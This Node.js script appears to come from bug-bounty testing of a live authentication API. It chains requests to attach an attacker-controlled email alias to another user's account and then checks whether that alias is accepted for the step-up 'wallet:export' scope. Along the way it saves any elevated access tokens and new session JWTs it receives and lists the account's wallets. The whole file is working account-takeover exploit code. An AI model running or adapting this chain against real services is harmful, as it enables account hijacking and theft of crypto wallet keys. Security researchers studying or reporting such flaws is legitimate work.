#!/usr/bin/env node
// idor13f: TOK_A (account A = victim surrogate, LIVE real-client session) attack chain
// Step A: verify-attach ev7 (attacker alias) onto account A  [BUG-003 primitive on a 2nd account]
// Step B: stepUp/check credentials[] — does attached ev7 become OTP-eligible for wallet:export?
// Step C: wallet discovery from verify response user object
const crypto = require('crypto');
const fs = require('fs');
const { execSync } = require('child_process');
const OUT = '/home/z/my-project/recon/idor13';
const API = 'https://app.dynamicauth.com/api/v0';
const ENV_SDK = 'fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9';
const UUID = process.argv[3] || '59337bda-1323-45e4-a881-d81ebd51fd02';
const OTP = process.argv[2];
if (!OTP) { console.error('usage: node idor13f_toka.js <otp> [uuid]'); process.exit(1); }

// TOK_A session_public_key claim (compressed 66hex) -> recomputed SPKI-DER-hex (182hex)
const TOK_A = execSync('source /home/z/my-project/scripts/tokens.sh && echo $TOK_A', { shell: '/bin/bash' }).toString().trim();
const claims = JSON.parse(Buffer.from(TOK_A.split('.')[1], 'base64url').toString());
const comp = claims.session_public_key;
const p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffffn;
const a = -3n % p, b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604bn;
const buf = Buffer.from(comp, 'hex'); const par = BigInt(buf[0] - 2);
const x = BigInt('0x' + buf.slice(1).toString('hex'));
const rhs = (x * x % p * x % p + a * x % p + b) % p;
let y = (rhs * ((p + 1n) / 4n)) % p; if (y % 2n !== par) y = p - y;
const SPKI = process.argv[4] || comp;  // default: claim verbatim (compressed) — verify matches claim exactly; pass 'spki' for DER-hex form
console.log('TOK_A sub:', claims.sub, '| spk:', comp.slice(0, 20) + '...');
console.log('SPKI recomputed:', SPKI.slice(0, 40) + '... len', SPKI.length);

function curl(method, url, body, headers) {
  const hh = Object.entries(headers || {}).map(([k, v]) => ['-H', `${k}: ${v}`]).flat();
  const args = ['-s', '-m', '25', '-w', '\n__HTTP__%{http_code}', '-X', method, url, ...hh];
  if (body) args.push('-d', body);
  const out = execSync(`curl ${args.map(a2 => `'${String(a2).replace(/'/g, `'\\''`)}'`).join(' ')}`, { maxBuffer: 10e6 }).toString();
  const idx = out.lastIndexOf('__HTTP__');
  return { status: parseInt(out.slice(idx + 8).trim(), 10), body: out.slice(0, idx) };
}
const H = { 'X-Request-Purpose': 'Research', 'X-Bugcrowd-Ninja': 'zeno0', 'Content-Type': 'application/json' };

console.log('\n[A] POST emailVerifications/verify — attach ev7 to account A (purpose: none in create)');
const r = curl('POST', `${API}/sdk/${ENV_SDK}/emailVerifications/verify`,
  JSON.stringify({ verificationUUID: UUID, verificationToken: OTP, sessionPublicKey: SPKI }),
  { ...H, Authorization: `Bearer ${TOK_A}` });
console.log('   ', r.status, r.body.slice(0, 250));
fs.writeFileSync(`${OUT}/toka_attach.full`, `${r.body}\nHTTPCODE:${r.status}`);

if (r.status !== 200) { console.log('[VERDICT] attach failed — see above'); process.exit(0); }
const d = JSON.parse(r.body);
const u = d.user || {};
console.log('    new session sub:', d.jwt ? JSON.parse(Buffer.from(d.jwt.split('.')[1], 'base64url').toString()).sub : 'n/a');
console.log('    elevatedAccessToken:', d.elevatedAccessToken ? 'PRESENT len ' + d.elevatedAccessToken.length : 'ABSENT');
if (d.elevatedAccessToken) fs.writeFileSync(`${OUT}/toka.ELEVATED`, d.elevatedAccessToken);
if (d.minifiedJwt) fs.writeFileSync(`${OUT}/toka_new.mini`, d.minifiedJwt);
if (d.jwt) fs.writeFileSync(`${OUT}/toka_new.jwt`, d.jwt);
console.log('    verifiedCredentials:');
for (const c of (u.verifiedCredentials || [])) console.log('     ', c.email, c.id, 'wallet:', c.embeddedWalletId || '-');
console.log('    embeddedWallets:', JSON.stringify(u.embeddedWallets || null));

const TOK = d.minifiedJwt || TOK_A;
console.log('\n[B] POST stepUp/check {scope:wallet:export} — credentials[] after attach');
const s = curl('POST', `${API}/sdk/${ENV_SDK}/stepUp/check`, JSON.stringify({ scope: 'wallet:export' }), { ...H, Authorization: `Bearer ${TOK}` });
console.log('   ', s.status, s.body.slice(0, 500));
fs.writeFileSync(`${OUT}/toka_stepup_check.full`, `${s.body}\nHTTPCODE:${s.status}`);
try {
  const sc = JSON.parse(s.body);
  const ev7 = (sc.credentials || []).find(c => (c.alias || '').includes('ev7'));
  console.log('\n[VERDICT-B] ev7 in stepUp credentials[]:', ev7 ? 'YES -> ' + JSON.stringify(ev7) : 'NO');
  console.log('    defaultCredentialId:', sc.defaultCredentialId, '| isRequired:', sc.isRequired);
} catch (e) { console.log('    (parse fail)'); }
